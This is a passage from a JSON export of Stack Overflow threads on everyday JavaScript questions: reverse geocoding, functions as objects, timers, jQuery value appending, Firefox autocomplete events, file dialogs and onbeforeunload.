                    "body": "<p>You could use Google Geo API. A sample code for API V3 is available on <a href=\"http://javascriptdeveloper.ca/convert-latitude-and-longitude-coordinates-to-address-using-google-geocoding-api-v3-javascript-jquery/\" rel=\"nofollow\">my blog</a></p>\n\n<pre><code>&lt;HEAD&gt;\n  &lt;TITLE&gt;Convert Latitude and Longitude (Coordinates) to an Address Using Google Geocoding API V3 (Javascript)&lt;/TITLE&gt;\n\n  &lt;script src=\"//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js\"&gt;&lt;/script&gt;\n  &lt;script&gt;\n\n    var address = new Array();\n\n    /*\n    * Get the json file from Google Geo\n    */\n    function Convert_LatLng_To_Address(lat, lng, callback) {\n            var url = \"http://maps.googleapis.com/maps/api/geocode/json?latlng=\" + lat + \",\" + lng + \"&amp;sensor=false\";\n            jQuery.getJSON(url, function (json) {\n                Create_Address(json, callback);\n            });     \n    }\n\n    /*\n    * Create an address out of the json \n    */\n    function Create_Address(json, callback) {\n        if (!check_status(json)) // If the json file's status is not ok, then return\n            return 0;\n        address['country'] = google_getCountry(json);\n        address['province'] = google_getProvince(json);\n        address['city'] = google_getCity(json);\n        address['street'] = google_getStreet(json);\n        address['postal_code'] = google_getPostalCode(json);\n        address['country_code'] = google_getCountryCode(json);\n        address['formatted_address'] = google_getAddress(json);\n        callback();\n    }\n\n    /* \n    * Check if the json data from Google Geo is valid \n    */\n    function check_status(json) {\n        if (json[\"status\"] == \"OK\") return true;\n        return false;\n    }   \n\n    /*\n    * Given Google Geocode json, return the value in the specified element of the array\n    */\n\n    function google_getCountry(json) {\n        return Find_Long_Name_Given_Type(\"country\", json[\"results\"][0][\"address_components\"], false);\n    }\n    function google_getProvince(json) {\n        return Find_Long_Name_Given_Type(\"administrative_area_level_1\", json[\"results\"][0][\"address_components\"], true);\n    }\n    function google_getCity(json) {\n        return Find_Long_Name_Given_Type(\"locality\", json[\"results\"][0][\"address_components\"], false);\n    }\n    function google_getStreet(json) {\n        return Find_Long_Name_Given_Type(\"street_number\", json[\"results\"][0][\"address_components\"], false) + ' ' + Find_Long_Name_Given_Type(\"route\", json[\"results\"][0][\"address_components\"], false);\n    }\n    function google_getPostalCode(json) {\n        return Find_Long_Name_Given_Type(\"postal_code\", json[\"results\"][0][\"address_components\"], false);\n    }\n    function google_getCountryCode(json) {\n        return Find_Long_Name_Given_Type(\"country\", json[\"results\"][0][\"address_components\"], true);\n    }\n    function google_getAddress(json) {\n        return json[\"results\"][0][\"formatted_address\"];\n    }   \n\n    /*\n    * Searching in Google Geo json, return the long name given the type. \n    * (if short_name is true, return short name)\n    */\n\n    function Find_Long_Name_Given_Type(t, a, short_name) {\n        var key;\n        for (key in a ) {\n            if ((a[key][\"types\"]).indexOf(t) != -1) {\n                if (short_name) \n                    return a[key][\"short_name\"];\n                return a[key][\"long_name\"];\n            }\n        }\n    }   \n\n  &lt;/SCRIPT&gt;\n&lt;/HEAD&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You could try <a href=\"https://mapzen.com/pelias\" rel=\"nofollow\">https://mapzen.com/pelias</a> it's open source and actively being developed.\ne.g.\n<code>\n    http://pelias.mapzen.com/reverse?lat=40.773656&amp;lon=-73.9596353\n</code>\nreturns (after formatting):\n<code>\n{\n   \"type\":\"FeatureCollection\",\n   \"features\":[\n      {\n         \"type\":\"Feature\",\n         \"properties\":{\n            \"id\":\"address-node-2723963885\",\n            \"type\":\"osmnode\",\n            \"layer\":\"osmnode\",\n            \"name\":\"151 East 77th Street\",\n            \"alpha3\":\"USA\",\n            \"admin0\":\"United States\",\n            \"admin1\":\"New York\",\n            \"admin1_abbr\":\"NY\",\n            \"admin2\":\"New York\",\n            \"local_admin\":\"Manhattan\",\n            \"locality\":\"New York\",\n            \"neighborhood\":\"Upper East Side\",\n            \"text\":\"151 East 77th Street, Manhattan, NY\"\n         },\n         \"geometry\":{\n            \"type\":\"Point\",\n            \"coordinates\":[-73.9596265, 40.7736566]\n         }\n      }\n   ],\n   \"bbox\":[-73.9596265, 40.7736566, -73.9596265, 40.7736566],\n   \"date\":1420779851926\n}\n</code></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<pre><code>var geocoder  = new google.maps.Geocoder();             // create a geocoder object\nvar location  = new google.maps.LatLng(position.coords.latitude, position.coords.longitude);    // turn coordinates into an object          \ngeocoder.geocode({'latLng': location}, function (results, status) {\nif(status == google.maps.GeocoderStatus.OK) {           // if geocode success\nvar add=results[0].formatted_address;         // if address found, pass to processing function\ndocument.write(add);\n</code></pre>\n\n<p>source from <a href=\"https://gist.github.com/marchawkins/9406213/download#\" rel=\"nofollow\">https://gist.github.com/marchawkins/9406213/download#</a> it works me</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Given the latitude and longitude, how do we convert it to street address using Javascript or Python?</p>\n",
            "last_activity_date": 1422445557,
            "question_id": 6574585,
            "score": 11,
            "tags": [
                "javascript",
                "python",
                "geolocation"
            ],
            "title": "How to convert longitude and latitude to street address"
        },
        {
            "answer_count": 10,
            "answers": [
                {
                    "body": "<p>Every function is an object. Objects can contain functions (methods) but an object is not necessary a function.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Every function is an Object.   </p>\n\n<p>I'm not an javascript expert, but I cannot see how every Object is a function.  (I can see how every object <em>could be</em> a function, but that's different)</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>It would be better to say that in JavaScript everything can be treated as an object, that includes primitive types as well as functions types; what the JavaScript interpreter does is that it automatically promotes your primitives and functions to their object wrapper types when you interact with them.</p>\n\n<p>There is also a Function object, an a number of equivalent Wrappers for the other primitives in JavaScript, that means that you can even call methods on functions instances, like:</p>\n\n<pre><code>myFunction(someArg).call(this)\n</code></pre>\n\n<p>That being said, <strong>not every object is in fact a function.</strong></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<ol>\n<li><p>Anything that is not a primitive type (undefined, null, number, string, boolean) is an object (or an instance) in JavaScript. That means <code>function</code> inherits from <code>object</code>.</p></li>\n<li><p>Object instances can contain more instances which can be functions. That's what we call a \"method\" (since it has an automatic <code>this</code> variable).</p></li>\n<li><p>Since you can't \"call\" every Object instance, not every object is a function.</p></li>\n</ol>\n",
                    "is_accepted": true,
                    "score": 12
                },
                {
                    "body": "<p>Also <code>Function</code> is always a property of an <code>object</code>.</p>\n\n<p>This mean that all functions in JavaScript is always bound to an object. If you don't specify an object to bind a function to it's bound to the window object (Also called global functions)</p>\n\n<p>..fredrik</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>As others have said, functions are objects that can be passed around by reference like other js objects. Not all objects are functions, only those that are declared as such.</p>\n\n<p>You will often see methods declared like so:</p>\n\n<pre><code>var myFunc = function(foo, bar) {\n    ...\n};\n</code></pre>\n\n<p>This is to reinforce the fact that the mthod is a function object and as such it is a property of the object where it is defined, just like any other variable you might define with <code>var</code>.</p>\n\n<p>This is the foundation of the most important feature in javascript, <a href=\"http://stackoverflow.com/questions/111102/how-does-a-javascript-closure-work\"><em>closure</em>.</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Quoting from <a href=\"https://developer.mozilla.org/en/JavaScript/Guide/Working_with_Objects\" rel=\"nofollow\">Working with Objects - MDN Docs</a><br>\nsection <a href=\"https://developer.mozilla.org/en/JavaScript/Guide/Working_with_Objects#Using_Object_Initializers\" rel=\"nofollow\">Using Object Initializers</a> last paragraph:</p>\n\n<p>\"In JavaScript 1.1 and earlier, you cannot use object initializers. You can create objects only using their constructor functions or using a function supplied by some other object for that purpose. See <a href=\"https://developer.mozilla.org/en/JavaScript/Guide/Working_with_Objects#Using_a_Constructor_Function\" rel=\"nofollow\">Using a Constructor Function</a>.\"</p>\n\n<p>meant that all objects WERE functions! Specifically, upon evaluation, instances or instantiations of functions.</p>\n\n<p>Literally, ALL objects of that vintage were created syntactically with constructs like:</p>\n\n<pre><code> \"newobj = new constructFunctor(arg1,arg2){this.prop1=arg1 /* etc */}(val1,val2)\"\n</code></pre>\n\n<p>AND in the string that makes the object \"<code>newobj</code>\" there is the word \"<code>constructFunctor</code>\", the name of a function. The statement is intentionally quoted to impress the fact that it must be <code>eval()</code>'d to be executed. Prior to execution \"<code>newobj</code>\" is \"equated to\" a function because the statement MUST have one and \"is\" one by virtue of \"<code>constructFunctor</code>\"'s literal existence to define <code>newobj</code>'s value upon execution. The quoting, and not, is very intentional in order to elucidate this abstraction. However, because JavaScript DOES have an <code>eval</code> function, this abstraction is in fact intentionally incorporated into the JavaScript language.</p>\n\n<p>The legacy of this is still fundamental to JavaScript, though some syntactic short cuts have been added as \"object initializers\" using the shorthand notation like: \"<code>no={}</code>\". That the paragraph quoted above is still resident in the current documentation IS significant for the very reasons noted.</p>\n\n<p>Furthermore, JavaScript also exemplifies the fundamental paradigms of Functional Programming. This defines everything as a function using the abstractions of Recursive Function Theory and the Lambda Calculus! For instance 0(), 1(), 2(), ... are the constant nonary functions better known as 0,1,2,3, ...</p>\n\n<p>JavaScript is completely consistent with a Functional Programming Style approach rather than the common OOPS (pun intended Object Oriented Programming Style).</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>The selected answer is wrong. In JavaScript everything is a function, except  primitive types. Object itself is a function which is called function Object(). Use for example the following code:</p>\n\n<pre><code>&lt;script&gt;\n    alert(Object);\n&lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>the selected answer by Aaron Digulla's is not 100% correct because it says, </p>\n\n<blockquote>\n  <p>Anything that is not a primitive type (undefined, null, number,\n  <strong>string</strong>, boolean) is an object.</p>\n</blockquote>\n\n<p>but a string is an object. That is why you can do things like: </p>\n\n<pre><code>myString=\"Hello World\";\n\nx = myString.length;\nnewString = myString.toUpperCase();\nlink = myString.link(\"http://www.hello-world.com/\");\n</code></pre>\n\n<p>And many other methods can be applied to the string object.</p>\n\n<p>You could also initialize the string like: </p>\n\n<pre><code>myString = new String(\"Hello, World!\");\n</code></pre>\n\n<p>But because a string is also a datatype it is much easier to initialize it by just applying a value.</p>\n\n<p>Not necessarily an answer to the question ... just a clarification/correction of Aaron Digulla's answer.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>From an O'Reilly page explaining this concept:\n<a href=\"http://radar.oreilly.com/2014/05/what-it-really-means-when-people-say-everything-in-javascript-is-an-object.html\" rel=\"nofollow\">O'Reilly Explanation</a></p>\n\n<blockquote>\n  <p>When you begin programming with JavaScript you might run across books, tutorials, and people who say \u201cEverything in JavaScript is an object.\u201d While it\u2019s not 100% true (not <em>everything</em> is an object), it is <em>mostly</em> true.</p>\n</blockquote>\n\n<p>Values in Javascript fall into two categories:</p>\n\n<p>1) Primitives:</p>\n\n<ul>\n<li>numbers</li>\n<li>booleans</li>\n<li>strings</li>\n<li>null</li>\n<li>undefined</li>\n</ul>\n\n<p>2) Objects: everything else, for example</p>\n\n<ul>\n<li>Math</li>\n<li>Date</li>\n<li>JSON</li>\n<li>window</li>\n<li>document</li>\n<li>objects you create</li>\n<li>arrays</li>\n<li>functions</li>\n</ul>\n\n<p>Functions are special kinds of objects - objects you can call and get values back from. Since functions are objects, they have properties and methods. Take this example:</p>\n\n<pre><code>function Car(name, size, weight) {\n    this.name = name;\n    this.size = size;\n    this.weight = weight;\n}\n\nCar.prototype = new Van() ;\n</code></pre>\n\n<p>In this example, we're actually calling the prototype property of the <code>Car()</code> function. Prototype is a <em>property</em> of that function. </p>\n\n<p><code>call()</code> would be a <em>method</em> of the function, for example. </p>\n\n<hr>\n\n<p>Furthermore, what does it mean in Javascript when people say functions are <em>first class</em> objects. It means you can:</p>\n\n<ul>\n<li>Assign a function to a variable</li>\n<li>Store a function as a value in an array or object</li>\n<li>Pass a function to a function </li>\n<li>Return a function from a function</li>\n</ul>\n\n<p>If you understand that a function is just an object, all of these make sense.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I was reading this link <a href=\"http://en.wikipedia.org/wiki/JavaScript_syntax\">JavaScript_syntax</a></p>\n\n<p>This seems to be cyclic - that every function is an Object and every Object itself is a function. Which is the atomic one? Can someone explain in a better way?</p>\n",
            "last_activity_date": 1426170580,
            "question_id": 3449596,
            "score": 11,
            "tags": [
                "javascript"
            ],
            "title": "Every Object is a function and every function is Object - Which is Correct?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>You can use as many as you want.  Just remember that JavaScript is single threaded, so none of them can execute in parallel.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>On a page you can have as many setTimeouts/setIntervals running at once as you wish, however in order to control each individually you will need to assign them to a variable.</p>\n\n<pre><code>var interval_1 = setInterval(\"callFunc1();\",2000);\nvar interval_2 = setInterval(\"callFunc2();\",1000);\nclearInterval(interval_1);\n</code></pre>\n\n<p>The same code above applies to setTimeout, simply replacing the wording.</p>\n\n<p>As Kevin has stated, JavaScript is indeed single threaded, so while you can have multiple timers ticking at once, only one can fire at any one time - i.e. if you have one that fires a function which 'halts' in execution, for example with an alert box, then that JS must be 'resumed' before another can trigger I believe.</p>\n\n<p>One further example is given below. While the markup is not valid, it shows how timeouts work.</p>\n\n<pre><code>&lt;html&gt;\n    &lt;body&gt;\n        &lt;script type=\"text/javascript\"&gt;\n            function addThing(){\n                var newEle = document.createElement(\"div\");\n                newEle.innerHTML = \"Timer1 Tick\";\n                document.body.appendChild(newEle);\n            }   \n            var t1= setInterval(\"addThing();\",1000);\n            var t2 = setInterval(\"alert('moo');\",2000);\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 16
                },
                {
                    "body": "<pre><code>var interval_1 = setInterval(\"callFunc1();\",2000);\n</code></pre>\n\n<p>calls eval() which is evil so it's BAD.\nUse that instead :\n    var interval_1 = setInterval(callFunc1,2000);\nAnd for the qustion, you may use as many as you want but if all have the same interval between two action, you better do it that way :\n    var interval = setInterval(function() {\n        fct1();\n        fct2();\n    },2000);</p>\n",
                    "is_accepted": false,
                    "score": 6
                }
            ],
            "body": "<p>I have to use atleast 2 setTimeouts and 1 setInterval. Does this have any dependency on the browser or javascript engine being used? </p>\n",
            "last_activity_date": 1387237217,
            "question_id": 2553138,
            "score": 11,
            "tags": [
                "javascript",
                "settimeout"
            ],
            "title": "how many javascript setTimeout/ setInterval call can be set simultaneously in one page?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>I've never come across anything like that, doesn't mean it doesn't exist though.</p>\n\n<p>I usually just store val() in a temporary variable and do the manipulation on that, then call val(temp) in a separate line.  It spreads the operation out to three or more lines, but it's still more readable than <code>.val(.val() + \"\")</code>, IMO.  It also scales better than +=, if you have a more complicated expression to do to the value.</p>\n\n<pre><code>var temp = $(\".abc\").val();\ntemp += \"test\";\n$(\".abc\").val(temp);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>You could go back to the original DOM element.</p>\n\n<pre><code> $(\"#abc\").get(0).value += \"test\";\n</code></pre>\n\n<p>Otherwise, you'd have to write a plugin</p>\n\n<pre><code> $.fn.appendVal = function (newPart) {\n   return this.each(function(){ $(this).val( $(this).val() + newPart); });\n };\n\n $(\"#abc\").appendVal(\"test\");\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 18
                },
                {
                    "body": "<p><code>$()</code> returns a selection; it doesn't return the actual resulting object (although in practice, it simply returns a list of the actual objects). If you want to mutate the object's <code>.value</code> property, you can do this:</p>\n\n<pre><code>$('.abc').each(function(){ this.value += foo; });\n</code></pre>\n\n<p>If you like, you can create functions that operate on selections, such as <code>.add()</code>, which could be implemented like this:</p>\n\n<pre><code>jQuery.fn.extend({ add: function(k,v) { this[k](this[k]()+v); } });\n</code></pre>\n\n<p>which can then be used like this:</p>\n\n<pre><code>$('.abc').add('val', foo);\n</code></pre>\n\n<p>...but I don't think this is any better than using <code>$().each()</code></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\" /&gt;\n&lt;title&gt;Untitled Document&lt;/title&gt;\n&lt;script type=\"text/javascript\" src=\"jquery-1.3.2.min.js\"&gt;&lt;/script&gt;\n&lt;script type=\"text/javascript\"&gt;\n\n    (function($){\n    \t$.fn.valInc = function(vadd)\n    \t{\n    \t\tvar val = $(this).val() + '' + vadd;\n    \t\t$(this).val(val);\n    \t}\n    })(jQuery);\n\n    $(function(){\n    \t$(\"#tst\").valInc('test 2');\n    });\n\n&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;input id='tst' value=\"test\" /&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Since jQuery 1.4, it is possible to pass a function to <a href=\"http://api.jquery.com/val/#val2\"><code>.val()</code></a> which gets the current value as second argument:</p>\n\n<pre><code>$(\"#abc\").val(function(i, val) {\n    return val + \"test\";\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 8
                }
            ],
            "body": "<p>Classic javascript:</p>\n\n<pre><code>var myvar = document.getElementById(\"abc\");\nabc.value += \"test\";\nabc.value += \"another test\";\n</code></pre>\n\n<p>Jquery:</p>\n\n<pre><code>$(\"#abc\").val($(\"#abc\").val()+\"test\");\n$(\"#abc\").val($(\"#abc\").val()+\"another test\");\n</code></pre>\n\n<p>Is there a way to make my Jquery prettier, maybe with a hidden += function that I could use? I know that .val() is not an attribute, but I feel there must be a way to make this code more beautiful to look at...</p>\n\n<p>Something like this would be great:</p>\n\n<pre><code> $(\"#abc\").valueAttribute += \"test\"\n $(\"#abc\").val().content += \"test\"\n $(\"#abc\").val().add(\"test\")\n</code></pre>\n",
            "last_activity_date": 1300535694,
            "question_id": 1224133,
            "score": 11,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "Is it possible to do &quot;.value +=&quot; in JQuery?"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>A possibly alternative: could you simply use a timer to tell when the value of the text box changes?</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You're going to have to blur the input field and reset the focus to it.  That's going to require a little trickeration though.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>If it makes you feel better, it is a <a href=\"https://bugzilla.mozilla.org/show%5Fbug.cgi?id=87943\">known bug</a></p>\n\n<p>Proposed workaround: (Not mine, from <a href=\"http://forums.mozillazine.org/viewtopic.php?f=38&amp;t=584166&amp;start=0&amp;st=0&amp;sk=t&amp;sd=a\">here</a></p>\n\n<pre><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Mozilla Firefox Problem&lt;/title&gt;\n&lt;script type=\"text/javascript\"&gt;\nfunction fOnChange()\n{\n  alert('OnChange Fired');\n}\n\nvar val_textBox;\n\nfunction fOnFocus()\n{\n  val_textBox = document.getElementById('textBox').value;\n}\n\nfunction fOnBlur()\n{\n  if (val_textBox != document.getElementById('textBox').value) {\n    fOnChange();\n  }\n}\n&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form name=\"frm\"&gt;\n&lt;table&gt;\n&lt;tr&gt;\n&lt;td&gt;&lt;input type=\"text\" id=\"textBox\" name=\"textBox\" onFocus=\"fOnFocus()\" onBlur=\"fOnBlur()\"&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n&lt;td&gt;&lt;input type=\"submit\" value=\"Submit\"&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 6
                },
                {
                    "body": "<p>Another Suggested work around. This time using polling, you can work it in exactly\nthe same way, checking for \"changes\" to your field. Tweak the poll value (default to\n375ms for your own taste).</p>\n\n<p>I've used jQuery and a jquery plugin someone wrote:\n<a href=\"https://github.com/cowboy/jquery-dotimeout/\" rel=\"nofollow\">https://github.com/cowboy/jquery-dotimeout/</a> </p>\n\n<p>Git Hub Src: <a href=\"https://raw.github.com/cowboy/jquery-dotimeout/master/jquery.ba-dotimeout.js\" rel=\"nofollow\">https://raw.github.com/cowboy/jquery-dotimeout/master/jquery.ba-dotimeout.js</a></p>\n\n<pre><code>&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"utf-8\"&gt;\n    &lt;title&gt;onChange() for Firefox / IE autofil get-around&lt;/title&gt;\n    &lt;script type=\"text/javascript\" src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\" src=\"http://code.jquery.com/jquery-latest.min.js\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\" src=\"/~dsloan/js/ba-dotimeout.js\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\"&gt;\n        $(document).ready(function(){\n            var val;\n            var count=0; // used to illustrate the \"poll count\" \n                         // when focusing on the element and typing \n                         // (vs not focused)\n\n            // set a focus function to poll the input\n            $(\"#myname\").focus(function() {\n\n                // start polling\n                $.doTimeout('checkname', 375, function() {\n                    ++count;\n\n                    // no changes, just exit this poll\n                    if($(\"#myname\").val() == val) {\n                        return true;\n\n                    // store the value\n                    } else {\n                        val = $(\"#myname\").val();\n                    }\n                    var str;\n\n                    // do stuff here with your field....\n                    if($(document.activeElement) &amp;&amp; \n                        ($(document.activeElement).attr('id') ==\n                        $(\"#myname\").attr('id'))) {\n\n                            var len = $(\"#myname\").val().length;\n                            if(len == 0) {\n                                str = 'Timer called, length 0...';\n                            } else if(len &lt; 2) {\n                                str = 'Timer called, length &lt; 2...';\n                            } else {\n                                str = 'Timer called, valid!';\n                            }\n                    }\n\n                    // show some debugging...\n                    $(\"#foo span\").html(str+' (count: '+count+'): '+\n                        $(document.activeElement).attr('id')+\n                        ', val: '+$(\"#myname\").val());\n\n                    return true;\n                });\n            });\n\n            // set a blur function to remove the poll\n            $(\"#myname\").blur(function() {\n                $.doTimeout('checkname');\n            });\n\n        });\n    &lt;/script&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;form action=\"#\" method=post&gt;\n        Name: &lt;input type=\"text\" name=\"name\" value=\"\" id=\"myname\" /&gt;\n        Scooby: &lt;input name=\"scooby\" value=\"\" id=\"scooby\" /&gt;\n        &lt;input type=\"submit\" value=\"Press Me!\" /&gt;\n    &lt;/form&gt;\n    &lt;div id=\"foo\"&gt;&lt;span&gt;&lt;/span&gt;&lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Firefox 4+ fire 'oninput' event when autocomplete is used.<br>\nHere's some jQuery to make this more actionable: </p>\n\n<pre><code>$('#password').bind('input', function(){ /* your code */});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 25
                },
                {
                    "body": "<p>I've had the same problem.</p>\n\n<p>Apparently, there is password manager debugging available\n<a href=\"https://wiki.mozilla.org/Firefox:Password_Manager_Debugging\">https://wiki.mozilla.org/Firefox:Password_Manager_Debugging</a></p>\n\n<p>So I've found that for me <strong>DOMAutoComplete</strong> event got triggered and\nI've managed to attach it sucessfuly to a field via jQuery's bind like</p>\n\n<pre><code>$('#email').bind('DOMAutoComplete',function() { ...\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 5
                }
            ],
            "body": "<p>I'm trying to subscribe to change events on an input tag for an ajax auto complete form. These change events are not firing when the user clicks an autocomplete suggestion from FireFox.</p>\n\n<p>I've seen fixes for IE, but not FireFox. You can view this behavior <a href=\"http://jehiah.cz/sandbox/onchange.html\">here</a> </p>\n\n<p>Steps to recreate:\ntype any input in one of the boxes and click submit. </p>\n\n<p>Start typing the value again in the same box. </p>\n\n<p>You should see the autocomplete suggestion box appear below the input box. Notice that clicking the suggestion does not fire the change event (it also doesn't fire the click event)</p>\n\n<p>Currently my only option is to disable autocomplete on this field, but I do not want to do that.</p>\n",
            "last_activity_date": 1331675309,
            "question_id": 865490,
            "score": 11,
            "tags": [
                "javascript",
                "firefox",
                "autocomplete"
            ],
            "title": "FireFox capture autocomplete input change event"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Yes, it's possible (in most browsers) via opacity. <a href=\"http://www.quirksmode.org/dom/inputfile.html\">Here's a tutorial</a>.</p>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>I've done this (see ceejayoz' answer) in the past, but now recommend against it. It is a security issue and can't be relied upon for the future. A much better solution is to progressively enhance your upload form so that the file input is replaced with a Flash- or Java-based uploader with more features (or use better features in HTML 5 if they become available).</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Instead of trying to hack the browser's file input control, I'd suggest using a flash based file uploader like <a href=\"http://swfupload.org/\" rel=\"nofollow\">SWFUpload</a>.  I've started using this in one of my projects and have been VERY pleased with it.</p>\n\n<p>You get javascript callbacks and you can do anything you want for a UI (the flash is just the uploading functionality).</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I'd rather avoid transparency tricks.</p>\n\n<p>This worked for me (uses jQuery):</p>\n\n<pre><code>$(\"#upload-box\").change(function(){\n    $(\"#upload-click-handler\").val($(this).val());\n});\n$(\"#upload-click-handler\").click(function(){\n    $(\"#upload-box\").click();\n});\n</code></pre>\n\n<p>And the HTML:</p>\n\n<pre><code>&lt;input id=\"upload-box\" style=\"visibility:hidden;height:0;\" name=\"Photo\" type=\"file\" /&gt;\n&lt;input id=\"upload-click-handler\" type=\"text\" readonly /&gt;\n</code></pre>\n\n<p>It creates a text input, and a hidden upload input, and patches (=routes) the click on the text input to the hidden file input.</p>\n\n<p>When a file is selected, it will write back the name of the file in the text input, in line with what most users would expect from the interface.</p>\n\n<p>Should work on FF, Chrome, IE9 and +. I didn't test it on IE8.</p>\n\n<p>Here's a <a href=\"http://jsfiddle.net/bM5L7/\" rel=\"nofollow\">jsfiddle</a>. Thank you for upvoting my answer if you like it.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You can do it without any security issues. \nJust code that on onmouseenter will promote the zindex of the real upload button (you can use opacity on it or make it transparent) and then you will not need to trigger a click but just use the click from the user.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Instead of using the <code>&lt;input type=\"file\"&gt;</code> tag I'd like to have a button that launches a file browser dialog.</p>\n\n<p>My first thought was to have a hidden file input tag and a button.  I'd use the button click on the button to fire the onclick of the hidden file input, but I haven't been able to get this working properly.</p>\n\n<p>So the question is, is this even possible?  And second is there a nicer way to do this and still be able to send the information back in a form?</p>\n\n<p>This will be the bottom layer of degrading functionality (from Flash to JavaScript (our site doesn't work without JS)) so it has to work with just basic JS and HTML.</p>\n",
            "last_activity_date": 1389795010,
            "question_id": 209509,
            "score": 11,
            "tags": [
                "javascript",
                "html"
            ],
            "title": "In JavaScript is it possible to launch a file browser dialog programatically?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>You have to <code>return</code> from the <code>onbeforeunload</code>:</p>\n\n<pre><code>window.onbeforeunload = function() {\n    saveFormData();\n    return null;\n}\n\nfunction saveFormData() {\n    console.log('saved');\n}\n</code></pre>\n\n<p><strong>UPDATE</strong></p>\n\n<p>as per comments, alert does not seem to be working on newer versions anymore, anything else goes :)</p>\n\n<p><em>FROM <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window.onbeforeunload#Notes\">MDN</em></a></p>\n\n<blockquote>\n  <p>Since 25 May 2011, the HTML5 specification states that calls to <code>window.showModalDialog()</code>, <code>window.alert()</code>, <code>window.confirm()</code>, and <code>window.prompt()</code> methods may be ignored during this event.</p>\n</blockquote>\n\n<p>It is also suggested to use this through the <code>addEventListener</code> interface:</p>\n\n<blockquote>\n  <p>You <em>can</em> and <em>should</em> handle this event through <code>window.addEventListener()</code> and the <code>beforeunload</code> event.</p>\n</blockquote>\n\n<p>The updated code will now look like this:</p>\n\n<pre><code>window.addEventListener(\"beforeunload\", function (e) {\n  saveFormData();\n\n  (e || window.event).returnValue = null;\n  return null;\n});\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 16
                },
                {
                    "body": "<p>you just cant do alert() in onbeforeunload, anything else works</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>To pop a message when the user is leaving the page to confirm leaving, you just do:</p>\n\n<pre><code>&lt;script&gt;\n    window.onbeforeunload = function(e) {\n      return 'Are you sure you want to leave this page?  You will lose any unsaved data.';\n    };\n&lt;/script&gt;\n</code></pre>\n\n<p>To call a function:</p>\n\n<pre><code>&lt;script&gt;\n    window.onbeforeunload = function(e) {\n       callSomeFunction();\n       return null;\n    };\n&lt;/script&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
